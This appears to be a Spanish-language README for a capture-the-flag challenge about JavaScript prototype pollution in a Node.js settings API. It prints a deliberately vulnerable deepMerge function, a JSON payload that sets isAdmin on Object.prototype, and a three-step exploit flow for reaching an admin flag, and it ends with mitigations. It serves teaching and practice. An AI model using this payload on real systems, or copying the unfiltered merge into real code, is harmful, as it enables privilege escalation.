# SettingsCorp — Prototype Pollution

Dificultad: Insane | Categoría: Web | Técnica: JavaScript Prototype Pollution

## Descripción

SettingsCorp ofrece una API REST en Node.js para gestionar preferencias de usuario. Los usuarios pueden iniciar sesión y actualizar su configuración enviando un JSON.

El endpoint `/settings/update` pasa los datos del usuario a una función `deepMerge()` personalizada que no filtra claves especiales de JavaScript.

## Vulnerabilidad

**Prototype Pollution** es una vulnerabilidad exclusiva de JavaScript que permite contaminar `Object.prototype`, el prototipo base del que heredan todos los objetos del runtime.

La función vulnerable:

```javascript
function deepMerge(target, source) {
    for (const key in source) {
        if (source[key] && typeof source[key] === 'object') {
            if (!target[key]) target[key] = {};
            deepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

Al recibir `{"__proto__": {"isAdmin": true}}`, la función accede a `target["__proto__"]`, que en JavaScript devuelve `Object.prototype`, y escribe `isAdmin = true` en él. A partir de ese momento, todos los objetos del proceso heredan `isAdmin = true`.

## Payload

```json
{
  "settings": {
    "__proto__": {
      "isAdmin": true
    }
  }
}
```

## Flujo del exploit

1. POST `/login` → obtener token
2. POST `/settings/update` con el payload → contaminar Object.prototype
3. GET `/admin/flag` → `user.isAdmin` es `true` (heredado) → flag

## Levantar el entorno

```bash
docker compose up --build
# Disponible en http://localhost:8080
```

## Ejecutar el solver

```bash
pip install requests
python3 solve.py
```

## Mitigación

- Filtrar claves peligrosas en merge: `__proto__`, `constructor`, `prototype`.
- Usar `Object.create(null)` para objetos sin prototipo.
- Usar `Object.freeze(Object.prototype)` en producción.
- Usar librerías seguras como `lodash >= 4.17.21` (parcheada).
